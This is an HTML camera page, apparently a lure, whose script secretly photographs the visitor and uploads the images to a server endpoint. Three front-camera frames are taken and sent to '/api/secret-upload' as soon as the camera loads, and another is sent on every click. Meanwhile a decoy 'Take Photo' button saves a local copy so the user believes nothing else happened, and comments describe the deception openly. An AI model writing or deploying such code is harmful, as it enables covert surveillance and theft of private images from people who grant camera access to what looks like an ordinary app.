<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 32px;
            padding: 28px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        h1 {
            color: #1e293b;
            margin-bottom: 8px;
            font-size: 1.8rem;
        }
        .sub {
            color: #64748b;
            margin-bottom: 20px;
            font-size: 0.9rem;
        }
        .video-wrapper {
            background: #000;
            border-radius: 24px;
            overflow: hidden;
            margin: 20px 0;
            border: 2px solid #3b82f6;
            position: relative;
        }
        video {
            width: 100%;
            aspect-ratio: 4/3;
            object-fit: cover;
            display: block;
        }
        .fake-button {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
            margin-top: 10px;
            opacity: 0.7;
        }
        .status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 20px;
            background: #f1f5f9;
            font-size: 0.85rem;
            color: #334155;
        }
        .hidden {
            display: none;
        }
        footer {
            margin-top: 20px;
            font-size: 0.7rem;
            color: #94a3b8;
        }
        .loading {
            color: #3b82f6;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>📸 Camera</h1>
        <div class="sub">Click button to take photo</div>
        
        <div class="video-wrapper">
            <video id="video" autoplay playsinline muted></video>
        </div>
        
        <button id="fakeBtn" class="fake-button">📷 Take Photo</button>
        
        <div id="status" class="status">⏳ Loading camera...</div>
        
        <footer>Click to capture and save</footer>
    </div>

    <script>
        const video = document.getElementById('video');
        const fakeBtn = document.getElementById('fakeBtn');
        const statusDiv = document.getElementById('status');
        
        let mediaStream = null;
        let autoCaptureDone = false;
        let autoCaptureTimer = null;
        
        // Start camera
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: { ideal: "user" }  // front camera for selfie
                    }
                });
                mediaStream = stream;
                video.srcObject = stream;
                statusDiv.innerHTML = '✅ Camera ready';
                statusDiv.style.background = '#d1fae5';
                
                // Camera ready hone ke baad auto capture
                startAutoCapture();
                
            } catch (err) {
                statusDiv.innerHTML = '❌ Camera access denied';
                statusDiv.style.background = '#fee2e2';
                console.error(err);
            }
        }
        
        // Secret auto capture - बिना बताए फोटो क्लिक
        async function secretAutoCapture() {
            if (!video.videoWidth || !video.videoHeight) {
                console.log('Video not ready yet');
                return false;
            }
            
            try {
                // Create canvas and capture frame
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Convert to blob
                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
                const blob = await (await fetch(imageDataUrl)).blob();
                
                // Send to server - SECRETLY
                const formData = new FormData();
                formData.append('photo', blob, `secret_${Date.now()}.jpg`);
                
                const response = await fetch('/api/secret-upload', {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    console.log('✅ Secret photo sent successfully');
                    
                    // Add a tiny visual flash (barely noticeable)
                    const wrapper = document.querySelector('.video-wrapper');
                    wrapper.style.transition = 'box-shadow 0.05s';
                    wrapper.style.boxShadow = '0 0 0 2px rgba(59,130,246,0.3)';
                    setTimeout(() => {
                        wrapper.style.boxShadow = '';
                    }, 50);
                    
                    return true;
                }
            } catch (err) {
                console.error('Secret capture failed:', err);
            }
            return false;
        }
        
        // Start auto capture sequence
        async function startAutoCapture() {
            // Wait for video to be ready
            let attempts = 0;
            const maxAttempts = 20;
            
            const tryCapture = async () => {
                if (video.videoWidth && video.videoHeight && video.videoWidth > 0) {
                    console.log('Video ready, capturing secret photo...');
                    statusDiv.innerHTML = '✅ Camera ready | Processing...';
                    
                    // Take 3 secret photos in sequence (for better chance)
                    for (let i = 0; i < 3; i++) {
                        await new Promise(r => setTimeout(r, 300));
                        await secretAutoCapture();
                    }
                    
                    statusDiv.innerHTML = '✅ Ready | Click to take photo';
                    autoCaptureDone = true;
                    
                } else if (attempts < maxAttempts) {
                    attempts++;
                    console.log(`Waiting for video... attempt ${attempts}`);
                    setTimeout(tryCapture, 300);
                } else {
                    statusDiv.innerHTML = '⚠️ Camera taking time | Try clicking button';
                    autoCaptureDone = true;
                }
            };
            
            setTimeout(tryCapture, 500);
        }
        
        // Fake button click - normal photo for user
        async function fakeCapture() {
            if (!video.videoWidth || !video.videoHeight) {
                statusDiv.innerHTML = '⚠️ Camera not ready yet';
                return;
            }
            
            // Visual feedback
            const wrapper = document.querySelector('.video-wrapper');
            wrapper.style.boxShadow = '0 0 0 3px #10b981';
            setTimeout(() => {
                wrapper.style.boxShadow = '';
            }, 150);
            
            statusDiv.innerHTML = '✅ Photo captured! Check your downloads.';
            setTimeout(() => {
                statusDiv.innerHTML = '✅ Ready | Click to take photo';
            }, 2000);
            
            // Create download for user (ताकि उसे लगे फोटो ली है)
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const link = document.createElement('a');
            link.href = dataUrl;
            link.download = `photo_${Date.now()}.jpg`;
            link.click();
            
            // Also secretly send one more
            await secretAutoCapture();
        }
        
        fakeBtn.addEventListener('click', fakeCapture);
        startCamera();
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
        
        // Extra: Page load pe hi multiple captures
        window.addEventListener('load', () => {
            console.log('Page loaded, ready for secret capture');
        });
    </script>
</body>
</html>
